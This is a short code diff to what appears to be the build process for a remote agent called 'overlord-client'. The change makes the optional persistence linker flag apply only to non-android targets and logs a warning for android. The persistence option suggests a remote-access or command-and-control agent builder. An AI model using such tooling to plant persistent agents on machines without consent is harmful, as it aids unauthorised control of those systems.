@@ -269,9 +269,13 @@ export async function startBuildProcess(
       }
 
       if (config.enablePersistence) {
-        const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
-        ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
-        sendToStream({ type: "output", text: `Persistence enabled for ${platform}\n`, level: "info" });
+        if (!platform.startsWith('android-')) {
+          const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
+          ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
+          sendToStream({ type: "output", text: `Persistence enabled for ${platform}\n`, level: "info" });
+        } else {
+          sendToStream({ type: "output", text: `Persistence is not supported on ${platform}, skipping...\n`, level: "warning" });
+        }
       }
 
       if (buildAgentToken) {
